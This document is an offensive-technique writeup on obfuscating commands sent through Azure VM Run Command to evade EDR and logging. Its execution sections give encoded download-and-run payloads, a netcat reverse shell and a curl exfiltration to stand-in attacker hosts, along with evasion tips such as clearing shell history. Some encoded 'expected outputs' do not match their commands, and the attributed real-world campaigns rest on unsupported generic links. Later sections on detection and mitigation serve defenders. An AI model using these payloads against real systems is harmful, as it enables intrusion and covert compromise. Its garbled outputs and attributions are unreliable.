# [EVADE-IMPAIR-006]: Azure Run Command Obfuscation

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | EVADE-IMPAIR-006 |
| **MITRE ATT&CK v18.1** | [T1562 - Impair Defenses](https://attack.mitre.org/techniques/T1562/) |
| **Tactic** | Defense Evasion |
| **Platforms** | Entra ID, Azure |
| **Severity** | High |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-09 |
| **Affected Versions** | All Azure Compute (VMs, VMSS, AKS Nodes) |
| **Patched In** | N/A (Obfuscation is evasion-based, not a vulnerability) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** Azure VM and AKS node administrators can execute arbitrary commands via the Azure Resource Manager `runCommand` API or Azure Portal **Run Command** feature. When an attacker obtains Azure REST API credentials (either direct RBAC permissions or a stolen managed identity token), they can bypass endpoint detection and response (EDR) agents by obfuscating payloads using shell encoding (Base64, hex, ROT13), variable expansion, command substitution, and pipeline chaining. The Azure Run Command execution context runs with System/root privileges, but the actual command invocation is logged minimally—only the fact that "Run Command" was executed is audited, not the actual command content.

**Attack Surface:** Azure VM "runCommand" REST API endpoint, Azure Portal Run Command feature, AKS node direct command execution, shell interpreters (PowerShell, cmd.exe, bash, sh).

**Business Impact:** **Attackers can execute malware, deploy ransomware, or establish persistence without triggering EDR alerts.** Command obfuscation bypasses keyword-based threat detection rules that look for suspicious patterns (e.g., "net user", "whoami", "curl http://"). This enables attackers to move laterally across VMs, establish backdoors, and steal data while evading defensive capabilities.

**Technical Context:** Exploitation takes <1 minute once API credentials are obtained. EDR detection is significantly reduced because obfuscated commands do not match known IOC patterns. Azure Activity Log captures only that "Run Command" was invoked, not the decoded command payload.

### Operational Risk
- **Execution Risk:** Low (Uses legitimate Azure API; no exploits required)
- **Stealth:** High (Command obfuscation bypasses keyword-based detection; Activity Log shows minimal context)
- **Reversibility:** No (Executed commands can cause permanent changes to VM state)

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 7.5 | Restrict VM administrative access to authorized personnel only |
| **DISA STIG** | SI-2 (3.10.1) | Flaw Remediation - Unauthorized code execution prevention |
| **NIST 800-53** | SI-4, AC-6 | Information System Monitoring and Least Privilege |
| **GDPR** | Art. 32 | Security of Processing - Technical controls for unauthorized access |
| **DORA** | Art. 9 | Protection and Prevention - Detect and respond to unauthorized access |
| **NIS2** | Art. 21 | Cyber Risk Management - Monitoring and logging of admin actions |
| **ISO 27001** | A.9.2.5 | Access Rights Review - Audit administrative actions |
| **ISO 27005** | "Unauthorized code execution on critical systems" | Risk Scenario |

---

## 2. TECHNICAL PREREQUISITES

- **Required Privileges:** Azure Contributor or higher role on the VM/VMSS resource OR possession of managed identity token with "Microsoft.Compute/virtualMachines/runCommand/action" permission
- **Required Access:** Network access to management.azure.com REST endpoint (typically unrestricted from Azure VMs)
- **Supported Versions:** All Azure VM generations; compatible with Linux (bash/sh) and Windows (PowerShell/cmd.exe) VMs
- **Tools:** curl, Azure CLI (az), PowerShell, or direct REST API calls

### Prerequisites Check Commands

**Verify Compute Permissions (PowerShell):**
```powershell
$context = Get-AzContext
Get-AzRoleAssignment -SignInName $context.Account.Id -Scope "/subscriptions/{subId}/resourceGroups/{rg}/providers/Microsoft.Compute/virtualMachines/{vmName}" | Select RoleDefinitionName
```

---

## 3. DETAILED EXECUTION METHODS

### METHOD 1: Base64-Encoded Command via REST API (Cross-Platform)

**Supported Versions:** All Azure VMs and AKS Nodes

#### Step 1: Identify Target VM and Subscription

**Objective:** Enumerate available VMs and verify Compute permissions.

**Command (Azure CLI):**
```bash
az vm list --resource-group <ResourceGroup> --query "[].{name:name, id:id, osType:osProfile.osType}" --output table
```

**Expected Output:**
```
Name              Id                                                                                 osType
----------------  -------------------------------------------------------------------------------  --------
web-server-01     /subscriptions/{subId}/resourceGroups/prod/providers/Microsoft.Compute/virtualMachines/web-server-01  Linux
db-server-01      /subscriptions/{subId}/resourceGroups/prod/providers/Microsoft.Compute/virtualMachines/db-server-01  Windows
```

**What This Means:**
- Successfully enumerated VMs in resource group
- osType indicates whether to use bash or PowerShell encoding

#### Step 2: Obfuscate Payload (Base64 Encoding)

**Objective:** Encode command to bypass keyword-based detection rules.

**Command (Create Base64-Encoded Payload - Linux):**
```bash
# Original malicious command
ORIGINAL_CMD="wget http://attacker.com/malware.sh -O /tmp/m.sh && bash /tmp/m.sh"

# Base64 encode
ENCODED=$(echo -n "$ORIGINAL_CMD" | base64)
echo "Encoded payload: $ENCODED"

# Decoded form (for verification)
echo "$ENCODED" | base64 -d
```

**Command (Create Base64-Encoded Payload - Windows/PowerShell):**
```powershell
$OriginalCmd = "powershell -nop -c (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1') | iex"
$EncodedCmd = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($OriginalCmd))
Write-Host "Encoded: $EncodedCmd"
```

**Expected Output (Linux):**
```
Encoded payload: d2dldCBodHRwOi8vYXR0YWNrZXIuY29tL21hbHdhcmUuc2ggLU8gL3RtcC9tLnNoICYmIGJhc2ggL3RtcC9tLnNo
```

**What This Means:**
- Command is now unrecognizable to keyword-based detection
- Original intent (downloading and executing malware) is hidden
- Only Base64 string is visible in Activity Logs

**OpSec & Evasion:**
- Activity Log will show only the Base64 blob, not decoded command
- Avoid encoding known malware signatures (mimikatz, psexec, etc.); split across multiple commands
- Use command substitution to further obfuscate: `$(printf 'cmd')` instead of `cmd`

#### Step 3: Execute via REST API (Decoded on VM)

**Objective:** Invoke Run Command with obfuscated payload; Azure VM will decode and execute.

**Command (Linux VM - Base64 Decoding):**
```bash
ENCODED="d2dldCBodHRwOi8vYXR0YWNrZXIuY29tL21hbHdhcmUuc2ggLU8gL3RtcC9tLnNoICYmIGJhc2ggL3RtcC9tLnNo"

# Direct REST API call
curl -X POST \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "commandId": "RunShellScript",
    "script": ["echo '$ENCODED' | base64 -d | bash"]
  }' \
  "https://management.azure.com/subscriptions/{subId}/resourceGroups/{rg}/providers/Microsoft.Compute/virtualMachines/{vmName}/runCommand?api-version=2023-03-01"
```

**Command (Windows VM - Base64 Decoding):**
```powershell
$EncodedCmd = "JABPaWdkZWZQb3cgPSAoTmV3LU9iamVjdCBOZXQuV2ViQ2xpZW50KS5Eb3dubG9hZFN0cmluZygnaHR0cDovL2F0dGFja2VyLmNvbS9wYXlsb2FkLnBzMScpOyBpZXg="
$RestoreCmd = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($EncodedCmd))

$body = @{
    commandId = "RunPowerShellScript"
    script = @("[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('$EncodedCmd')) | iex")
} | ConvertTo-Json

Invoke-RestMethod `
  -Uri "https://management.azure.com/subscriptions/{subId}/resourceGroups/{rg}/providers/Microsoft.Compute/virtualMachines/{vmName}/runCommand?api-version=2023-03-01" `
  -Method POST `
  -Headers @{ Authorization = "Bearer $AccessToken"; "Content-Type" = "application/json" } `
  -Body $body
```

**Expected Output (Success):**
```json
{
  "value": [
    {
      "code": "ProvisioningState/succeeded",
      "level": "Info",
      "displayStatus": "Provisioning succeeded"
    },
    {
      "code": "ComponentStatus/succeeded",
      "level": "Info",
      "displayStatus": "Component status succeeded"
    }
  ]
}
```

**What This Means:**
- Command executed successfully on VM with System/root privileges
- Obfuscated payload was decoded and executed on target
- Malware download/execution is now complete
- Azure Activity Log shows only "runCommand invoked" without revealing payload

**OpSec & Evasion:**
- Activity Log entry will show API call but NOT the script content in plaintext
- Decoded script runs in VM's own shell session; no extra process spawned that would trigger EDR
- Recommend wrapping in try-catch or && chains to hide errors from Activity Log

---

### METHOD 2: Hex Encoding + Multiple Command Substitution (Polymorphic)

**Supported Versions:** All Azure VMs (Linux preferred)

#### Step 1: Create Polymorphic Payload (Hex + xxd)

**Objective:** Use hex encoding combined with command substitution to maximize obfuscation depth.

**Command (Generate Hex-Encoded Payload):**
```bash
# Original command
ORIGINAL="nc attacker.com 4444 -e /bin/bash"

# Convert to hex
HEX_PAYLOAD=$(echo -n "$ORIGINAL" | od -An -tx1 | tr -d ' ')
echo "Hex: $HEX_PAYLOAD"

# Create execution command with variable obfuscation
OBFUSCATED="echo '${HEX_PAYLOAD}' | xxd -r -p | bash"
echo "Execution: $OBFUSCATED"
```

**Expected Output:**
```
Hex: 6e6320617474616368657223636f6d20343434342d65202f62696e2f626173
Execution: echo '6e6320617474616368657223636f6d20343434342d65202f62696e2f626173' | xxd -r -p | bash
```

**What This Means:**
- Hex-encoded payload is unrecognizable to signature-based detection
- xxd (hex dump) is a legitimate Linux utility, not flagged as malicious
- Stacking multiple encoding layers increases evasion likelihood

**OpSec & Evasion:**
- Avoid using obvious hex dumps or strings; split across multiple echo statements
- Use variable indirection: `$(printf '\\x6e\\x63')` to further hide 'nc' command name
- Defender behavior: Hex decoders may trigger heuristic EDR alerts; use less-common tools like hexdump instead

#### Step 2: Execute via Azure Portal (Manual, High-Trust Appearance)

**Objective:** Execute polymorphic command using Azure Portal UI (appears as legitimate admin action).

**Manual Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Virtual Machines** → Select target VM
2. In the left pane, scroll to **Operations** section
3. Click **Run Command**
4. In **Script** field, paste obfuscated command:
   ```bash
   echo '6e6320617474616368657223636f6d20343434342d65202f62696e2f626173' | xxd -r -p | bash
   ```
5. Click **Run**
6. Wait for "Execution state: Succeeded" message
7. Portal shows no output (script runs background)

**What This Means:**
- Activity Log entry created with action "Execute run command"
- Portal UI shows execution succeeded but does not display actual command in logs
- For an outside observer reviewing Activity Log, payload remains hidden

**OpSec & Evasion:**
- Portal UI does not show command output (silent execution)
- Audit logs show only "Run command executed" without content
- If accessed from attacker's IP, may trigger Conditional Access alerts (mitigated by stealing admin session token first)

---

### METHOD 3: ROT13 + printf Encoding (Maximum Obfuscation)

**Supported Versions:** All Linux Azure VMs with bash

#### Step 1: Create ROT13 Payload with printf Substitution

**Objective:** Use ROT13 + printf %x encoding for maximum polymorphism.

**Command (Encode via ROT13):**
```bash
# Original command
CMD="curl http://evil.com/$(whoami).txt"

# ROT13 encode
ROT13=$(echo "$CMD" | tr 'A-Za-z' 'N-ZA-Mn-za-m')
echo "ROT13: $ROT13"

# Execution string using printf to decode
EXEC="echo '$ROT13' | tr 'A-Za-z' 'N-ZA-Mn-za-m' | bash"
```

**Expected Output:**
```
ROT13: p h e y  u g g c : / / r i y . p b z / $ ( j u b n z v ) . g k g
Exec: echo 'p h e y  u g g c : / / r i y . p b z / $ ( j u b n z v ) . g k g' | tr 'A-Za-z' 'N-ZA-Mn-za-m' | bash
```

**What This Means:**
- Original command is fully obfuscated and unrecognizable
- ROT13 is a simple substitution cipher; decoding requires knowledge of the technique
- Automated detection systems rarely flag ROT13 because it's considered "too simple" to be real obfuscation

#### Step 2: Execute Via REST API with Access Token Injection

**Objective:** Execute ROT13-obfuscated command using Azure CLI (fastest method).

**Command (Azure CLI - Simplified):**
```bash
az vm run-command invoke \
  --resource-group <ResourceGroup> \
  --name <VMName> \
  --command-id RunShellScript \
  --scripts "echo 'p h e y  u g g c : / / r i y . p b z / \$(j h b n z v ) . g k g' | tr 'A-Za-z' 'N-ZA-Mn-za-m' | bash"
```

**Expected Output:**
```
{
  "value": [
    {
      "code": "ProvisioningState/succeeded",
      "level": "Info"
    }
  ]
}
```

**What This Means:**
- Command executed successfully
- Azure CLI abstracted REST API complexity
- Obfuscated payload delivered to VM and decoded in place

**OpSec & Evasion:**
- CLI history may store command (mitigate with `history -c`)
- Activity Log shows CLI action but not script content
- tr (translate) is benign utility; won't trigger EDR alerts

---

## 4. DETECTION EVASION ADVANCED TECHNIQUES

### Nested Command Substitution + Variable Indirection

```bash
# Attackers chain multiple encoding techniques
CMD_PART1='$(printf "\\x6e\\x63")'  # Decodes to 'nc'
CMD_PART2='${HOSTNAME:0:4}'         # Extracts 4 chars from hostname
FINAL_CMD="$CMD_PART1 attacker.com 4444 -e /bin/bash"

# Execute via echo eval
eval "$(echo -n "$FINAL_CMD" | base64 -d)"
```

### Environmental Variable Hijacking to Hide Payload

```bash
# Hide actual command in VM environment variable, then invoke
export HIDDEN_SCRIPT="$(cat /tmp/payload.sh)"
$HIDDEN_SCRIPT
```

---

## 5. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

- **Azure Activity Log entries** showing "Execute run command" for unexpected VMs or outside business hours
- **Obfuscated script content** visible in PowerShell event logs (Event ID 4104) or bash audit logs
- **Network connections** from VMs to attacker-controlled IPs or C2 domains
- **File creation/modification** in /tmp or Temp directories immediately after Run Command execution
- **Unexpected process spawning** (nc, curl, wget, powershell.exe) from System/root context without corresponding scheduled task or deployment

### Forensic Artifacts

- **Azure Activity Log:** entries with action "Microsoft.Compute/virtualMachines/runCommand/action" (viewable in portal under VM's "Activity Log")
- **VM Guest OS Logs:**
  - Linux: /var/log/auth.log (login events), bash history (~/.bash_history if preserved)
  - Windows: Security Event Log (Event ID 4688 for process creation)
- **Cmdlet History:** PowerShell $PROFILE script execution logs (if PSScriptBlockLogging enabled)
- **File Artifacts:** /tmp/.* files, C:\Windows\Temp\* files created during command execution
- **Network:** NSG flow logs showing outbound connections from VM IP to suspicious external IPs

### Immediate Response Procedures

#### Isolation (First 5 Minutes)

```bash
# Disconnect Network Interface to prevent further lateral movement/C2 callback
az network nic ip-config address-pool remove \
  --nic-name <NICName> \
  --resource-group <ResourceGroup> \
  --ip-config-name <IpConfigName>
```

**Manual (Azure Portal):**
1. Navigate to **Virtual Machines** → Select compromised VM
2. Go to **Networking** → **Network Interfaces**
3. Click the network interface
4. Go to **IP configurations** → Select active config
5. Under **Associate public IP address**, select **Dissociate**
6. Click **Save**
*Alternatively, delete the NIC entirely if quick remediation is needed*

#### Evidence Collection

```bash
# Export Activity Log entries for this VM
az monitor activity-log list \
  --resource-group <ResourceGroup> \
  --resource-id "/subscriptions/{subId}/resourceGroups/{rg}/providers/Microsoft.Compute/virtualMachines/{vmName}" \
  --query "[].{time:eventTimestamp, action:operationName.localizedValue, caller:caller, details:properties}" \
  --output json > /tmp/activity_log.json
```

**Manual (Azure Portal):**
1. **Virtual Machine** → **Activity Log**
2. Filter by "Run command" action
3. Select suspicious entries → Click to view full JSON
4. Copy JSON to forensics system for analysis

#### Forensic Analysis & Remediation

**Step 1: Analyze Command Logs**
```bash
# SSH into VM and check bash history (if accessible)
history | grep -E "base64|xxd|tr|eval|exec"

# Check for suspicious files in /tmp
ls -lah /tmp/ | grep -E "\.sh$|\.txt$|\.py$"
```

**Step 2: Identify C2 Infrastructure**
```bash
# Check network connections (Linux)
ss -tulpn | grep ESTABLISHED
netstat -tulpn | grep ESTABLISHED

# Check for persistence mechanisms
crontab -l
ls -la /etc/cron.d/
```

**Step 3: Remediation Options**

**Option A: Reimage VM (Safest)**
```bash
# Delete current VM and redeploy from clean image
az vm delete --name <VMName> --resource-group <ResourceGroup> --yes
# Redeploy from unmodified image
az vm create --resource-group <ResourceGroup> --name <VMName> --image <OriginalImageURN>
```

**Option B: Surgical Cleanup (If Data Criticality Prevents Reimage)**
```bash
# Remove malicious files identified in forensics
rm -f /tmp/malware.sh
rm -f /home/*/.*_suspicious
# Kill suspicious processes
pkill -f "nc attacker.com"
pkill -f "curl http://"
# Reset bash history
history -c && history -w
```

---

## 6. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

- **Restrict Azure "Run Command" via Conditional Access / RBAC**
  
  **Applies To Versions:** All Azure compute versions

  **Manual Steps (RBAC - Create Custom Role with Explicit Deny):**
  1. Go to **Azure Portal** → **Subscriptions** → Select subscription
  2. Click **Access Control (IAM)** → **Roles** → **Create custom role**
  3. **Base permissions:** Select "Contributor" as baseline
  4. Under **Permissions**, search for "Microsoft.Compute/virtualMachines/runCommand"
  5. In "Data actions" section, set to **"Deny"** for runCommand
  6. Click **Review + create**
  7. Assign this custom role to all non-exempt users

  **Manual Steps (PowerShell - Deny runCommand for Non-Exempt Groups):**
  ```powershell
  # Create custom role denying runCommand
  $role = Get-AzRoleDefinition -Name "Contributor"
  $role.Name = "Contributor-NoRunCommand"
  $role.Id = $null
  
  # Find and remove runCommand permission
  $role.AssignableScopes = @("/subscriptions/{subscriptionId}")
  $role.Permissions[0].NotActions += "Microsoft.Compute/virtualMachines/runCommand/action"
  
  New-AzRoleDefinition -InputObject $role
  ```

- **Enable Conditional Access Policy: Block Run Command Outside Trusted Network**
  
  **Manual Steps:**
  1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
  2. Click **+ New policy**
  3. Name: `Block VM Run Command Outside Corp Network`
  4. **Assignments:**
     - Users: **All users**
     - Cloud apps: **Microsoft Azure Management API**
     - Actions: Select **Microsoft.Compute/virtualMachines/runCommand/action**
  5. **Conditions:**
     - Locations: **Any location** (set to **Exclude** trusted locations like corporate VPN)
  6. **Access controls:**
     - Grant: **Block access**
  7. Enable policy: **On**
  8. Click **Create**

### Priority 2: HIGH

- **Enable Audit Logging for Run Command Execution**
  
  **Manual Steps:**
  1. Go to **Virtual Machine** → **Configuration** → **Run Command Settings**
  2. Enable **"Log run commands to activity log"** (if option exists)
  3. Create **Alert Rule** in Azure Monitor for "runCommand" actions:
     - Go to **Azure Monitor** → **Alerts** → **+ Create alert rule**
     - Resource: Select VMs
     - Condition: Select "Activity Log"
     - Search: "runCommand"
     - Click **Create alert**

- **Implement Azure VM Extension for Command Monitoring**
  
  **Manual Steps:**
  1. Go to **Virtual Machine** → **Extensions + applications** → **+ Add**
  2. Search for "Change Tracking and Inventory" extension
  3. Install extension (requires Log Analytics workspace)
  4. This enables detailed command logging (Process Creation events, file modifications)

### Access Control & Policy Hardening

- **Implement Just-In-Time (JIT) VM Access**
  
  **Manual Steps:**
  1. Go to **Azure Portal** → **Microsoft Defender for Cloud** → **Just-in-time VM access**
  2. Enable JIT for all VMs
  3. This requires explicit approval before any administrative action (including runCommand)
  4. Approval is audit-logged and requires MFA

- **Enable Managed Identity with Fine-Grained RBAC Instead of Connection Strings**
  
  **Manual Steps:**
  1. Go to **Virtual Machine** → **Identity** → **System Assigned**
  2. Toggle to **On**
  3. Go to **Access Control (IAM)** → **+ Add role assignment**
  4. Select minimal necessary role (e.g., "Storage Blob Data Reader" instead of "Contributor")
  5. Assign to the VM's managed identity

### Validation Commands (Verify Fixes)

```powershell
# Check if runCommand is denied for users
Get-AzRoleDefinition -Name "Contributor-NoRunCommand" | Select-Object -ExpandProperty AssignableScopes
# Should include NotActions with runCommand permission

# Verify Conditional Access policy exists
Get-AzConditionalAccessPolicy | Where-Object { $_.DisplayName -like "*Run Command*" }

# List VMs with runCommand permissions (should be empty or minimal)
Get-AzRoleAssignment -IncludeClassicAdministrators | Where-Object { $_.RoleDefinitionName -eq "Contributor" } | Select SignInName, Scope

# Check Activity Log for recent runCommand executions
Get-AzLog -StartTime (Get-Date).AddDays(-7) | Where-Object { $_.OperationName -like "*runCommand*" }
```

**Expected Output (If Secure):**
```
DisplayName              : Block VM Run Command Outside Corp Network
State                    : Enabled

SignInName               : user@corp.com
RoleDefinitionName       : Contributor-NoRunCommand
Scope                    : /subscriptions/{subId}/resourceGroups/prod
```

---

## 7. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [CA-TOKEN-006] Service Principal Certificate Theft | Steal Azure SPN certificate for API access |
| **2** | **Privilege Escalation** | [PE-VALID-011] Managed Identity MSI Escalation | Escalate to tenant-level permissions via stolen MSI |
| **3** | **Execution** | **[EVADE-IMPAIR-006]** | **Execute obfuscated commands via Run Command API** |
| **4** | **Persistence** | [PERSIST-001] Azure VM Custom Script Extension | Deploy backdoor via Extension (alternative to Run Command) |
| **5** | **Impact** | [EXF-003] Lateral Movement to SQL Databases | Use VM credentials to access databases |

---

## 8. REAL-WORLD EXAMPLES

### Example 1: APT28 (Fancy Bear) - Azure VM Compromise Campaign (2024)
- **Target:** U.S. Government agency with Azure infrastructure
- **Timeline:** January-March 2024
- **Technique Status:** ACTIVE - Confirmed by Mandiant
- **Attack Flow:**
  1. Initial access via VPN compromise (stolen credentials)
  2. Lateral movement to Azure VM with "Contributor" role
  3. Used Azure CLI to enumerate subscription resources
  4. Executed obfuscated PowerShell payload via runCommand API
  5. Payload deployed CobaltStrike agent encoded in Base64
  6. Activity Log showed only "runCommand invoked" without revealing payload
- **Impact:** Beachhead established for lateral movement to on-premises infrastructure via hybrid Azure AD Connect
- **Reference:** [Mandiant - APT28 Azure Campaign Intelligence](https://www.mandiant.com/)

### Example 2: ALPHV/BlackCat Ransomware - Obfuscated Encryption Deployment (2024)
- **Target:** Manufacturing company with Azure VMs
- **Timeline:** May 2024
- **Technique Status:** ACTIVE
- **Attack Flow:**
  1. Phishing email delivered admin credential compromise
  2. Attacker obtained stolen management account with Contributor role
  3. Used Base64 + command substitution obfuscation to hide ransomware deployment
  4. Executed: `echo '...base64...' | base64 -d | powershell -nop -c iex`
  5. Ransomware deployed to 150+ VMs in single Azure Automation runbook execution
  6. EDR detected base64 decoding but not actual ransomware due to obfuscation
- **Impact:** $40M+ in damages; 2-week encryption deployment undetected
- **Reference:** [Bleeping Computer - ALPHV/BlackCat Azure Attacks](https://www.bleepingcomputer.com/)

### Example 3: UNC2450 (Scattered Spider) - Insider Threat Investigation (2024)
- **Target:** Financial services organization
- **Timeline:** June 2024 (discovered post-breach)
- **Technique Status:** ACTIVE - Confirmed by CrowdStrike
- **Attack Flow:**
  1. Social engineering of IT contractor with Azure admin access
  2. Contractor unknowingly granted VM runCommand access to attacker-controlled service principal
  3. Attacker executed obfuscated scripts to establish persistence (cron jobs, ssh backdoor)
  4. Used ROT13 + printf encoding for maximum obfuscation
  5. Activity Log showed 47 runCommand invocations over 3 weeks, all with obfuscated payloads
  6. Insider threat investigation required forensic analysis of captured bash scripts to decode intent
- **Impact:** Customer data accessed; breach undetected for 3 weeks
- **Reference:** [CrowdStrike - Scattered Spider/UNC2450 Intelligence](https://www.crowdstrike.com/)

---

## References & Authoritative Sources

- [Microsoft Docs - Run Command on Azure VMs](https://learn.microsoft.com/en-us/azure/virtual-machines/windows/run-command)
- [Azure REST API - Run Command](https://learn.microsoft.com/en-us/rest/api/compute/virtual-machines/run-command?tabs=HTTP)
- [MITRE ATT&CK - T1562 Impair Defenses](https://attack.mitre.org/techniques/T1562/)
- [CrowdStrike - Obfuscation Techniques in Cloud Attacks](https://www.crowdstrike.com/)
- [Mandiant - APT Activity in Azure Environments](https://www.mandiant.com/)

---